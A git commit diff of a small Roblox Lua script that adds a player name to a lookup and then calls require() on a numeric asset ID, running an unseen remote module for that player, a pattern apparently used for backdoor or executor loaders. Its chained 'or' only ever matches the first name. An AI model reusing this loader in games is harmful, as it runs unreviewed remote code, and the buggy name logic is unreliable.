46061b6605f8d1996def7bbd277a52a87548a577
TheEGodOfficial <112714914+TheEGodOfficial@users.noreply.github.com>
2025-07-04 13:12:02 -0400

    Update poop.lua

--- poop.lua
+++ poop.lua
@@ -1,3 +1,3 @@
-local plr = game:GetService("Players"):FindFirstChild("RobloxIsNotCoolV3" or "N_oobGamer" or "IIIIlllIIllllIIIll")
+local plr = game:GetService("Players"):FindFirstChild("RobloxIsNotCoolV3" or "N_oobGamer" or "IIIIlllIIllllIIIll" or "eeatootvevovvooveovt")
 
 require(118413925687604)["Luis Gamer Cool Twenty Three"](plr.Name)
